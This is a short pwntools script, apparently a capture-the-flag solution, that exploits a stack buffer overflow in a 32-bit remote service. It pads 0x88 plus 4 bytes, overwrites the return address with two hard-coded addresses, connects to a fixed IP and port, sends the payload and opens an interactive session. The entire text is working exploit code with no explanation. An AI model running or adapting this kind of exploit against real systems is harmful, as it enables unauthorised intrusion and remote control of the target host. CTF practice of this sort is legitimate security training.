from pwn import *

payload = 'a' * 0x88 + 'a' * 4 + p32(0x0804849e) + p32(0x0804a024)

r = remote('111.198.29.45', 48503)

r.recvuntil('Input:')
r.sendline(payload)
r.interactive()
